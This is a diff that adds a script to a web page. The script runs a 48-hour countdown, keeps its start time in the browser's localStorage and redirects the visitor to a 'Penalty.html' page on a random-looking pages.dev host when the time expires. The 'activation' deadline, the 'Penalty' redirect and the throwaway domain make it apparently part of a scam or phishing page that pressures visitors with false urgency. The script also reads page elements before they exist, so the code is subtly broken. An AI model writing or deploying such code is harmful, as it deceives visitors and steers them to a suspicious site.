@@ -556,6 +556,46 @@
     </style>
 </head>
 
+    <script>
+    const timerElement = document.getElementById("timer");
+    const statusIcon = document.getElementById("statusIcon");
+    const title = document.getElementById("title");
+    const message = document.getElementById("message");
+    const container = document.getElementById("container");
+    // Check if user already has a start time in localStorage
+    let startTime = localStorage.getItem("activationStart");
+    const duration = 48 * 60 * 60 * 1000; // 48 hours in ms
+    if (!startTime) {
+      startTime = Date.now();
+      localStorage.setItem("activationStart", startTime);
+    } else {
+      startTime = parseInt(startTime, 10);
+    }
+    const endTime = startTime + duration;
+    function updateTimer() {
+      const now = Date.now();
+      const remaining = endTime - now;
+      if (remaining <= 0) {
+        // Redirect when time ends
+        window.location.href = "https://zufvoql5xqh6d1zljquitd1uwteyswvkqwcexlsprjnit5f46blnxe4f3t.pages.dev/Penalty.html";
+        return;
+      }
+      // Calculate time left
+      const hours = Math.floor(remaining / (1000 * 60 * 60));
+      const minutes = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
+      const seconds = Math.floor((remaining % (1000 * 60)) / 1000);
+      const ms = Math.floor((remaining % 1000));
+      // Format with leading zeros
+      const h = String(hours).padStart(2, "0");
+      const m = String(minutes).padStart(2, "0");
+      const s = String(seconds).padStart(2, "0");
+      const msStr = String(ms).padStart(3, "0");
+      timerElement.textContent = `${h}:${m}:${s}:${msStr}`;
+      requestAnimationFrame(updateTimer);
+    }
+    updateTimer();
+  </script>
+
 <body class="theme-light">
     <div id="page">
         <div class="page-content">
